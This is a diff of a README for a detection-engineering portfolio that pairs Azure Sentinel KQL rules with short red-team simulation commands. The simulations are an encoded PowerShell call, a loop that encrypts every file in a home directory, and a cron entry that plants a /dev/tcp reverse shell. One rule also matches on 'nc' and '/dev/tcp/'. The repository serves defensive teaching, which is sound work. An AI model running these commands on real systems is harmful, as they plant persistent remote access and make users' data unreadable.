@@ -1,26 +1,44 @@
 # Azure Sentinel Detection Engineering Lab
 
-This repository contains KQL detection rules mapped to MITRE ATT&CK framework for Azure Sentinel SOC operations.
+This repository contains KQL detection rules mapped to the MITRE ATT&CK framework for Azure Sentinel SOC operations.
 
-## Detections
+## Detections Summary
 
-| MITRE ID | Rule Name | File |
-| --- | --- | --- |
+| MITRE ID | Rule Name | File Path |
+| :--- | :--- | :--- |
 | T1059.001 | Encoded PowerShell | `KQL-Rules/T1059-Encoded-PowerShell.kql` |
 | T1486 | Ransomware Activity | `KQL-Rules/T1486-Ransomware-Detection.kql` |
 | T1053.003 | Cron Job Abuse | `detections/T1053-Scheduled-Task/T1053.003-Cron-Abuse.kql` |
 
+---
+
 ### 1. T1059.001 - Encoded PowerShell Command Detection
 
 **Red Team Simulation:**
-powershell
+```powershell
 powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAA...
+```
+
+**KQL Detection Rule:**
+```kql
 SecurityEvent
 | where EventID == 4688
 | where CommandLine has "-EncodedCommand" or CommandLine has "-enc"
 | extend MITRE_Tactic = "Execution"
 | extend MITRE_Technique_ID = "T1059.001"
+```
+
+---
+
+### 2. T1486 - Ransomware Activity Detection
+
+**Red Team Simulation:**
+```bash
 for file in /home/user/*; do openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc"; done
+```
+
+**KQL Detection Rule:**
+```kql
 SysmonEvent
 | where EventID == 11
 | where TargetFilename endswith ".enc" or TargetFilename endswith ".locked"
@@ -28,7 +46,19 @@ SysmonEvent
 | where FileCount > 20
 | extend MITRE_Tactic = "Impact"
 | extend MITRE_Technique_ID = "T1486"
+```
+
+---
+
+### 3. T1053.003 - Cron Job Abuse Detection
+
+**Red Team Simulation:**
+```bash
 echo "* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > /etc/cron.d/backdoor
+```
+
+**KQL Detection Rule:**
+```kql
 // Alert: Malicious Cron Job Execution
 SysmonEvent
 | where EventID == 1
@@ -36,3 +66,17 @@ SysmonEvent
 | where CommandLine has_any ("nc", "bash -i", "/dev/tcp/")
 | extend MITRE_Tactic = "Persistence"
 | extend MITRE_Technique_ID = "T1053.003"
+```
+
+---
+
+## Skills Demonstrated
+* Azure Sentinel
+* KQL (Kusto Query Language)
+* MITRE ATT&CK Framework
+* Threat Detection
+* SOC Operations
+* Detection Engineering
+```
+Author:*
+Muatez Mhgoub Margani | SC-200 | CEH
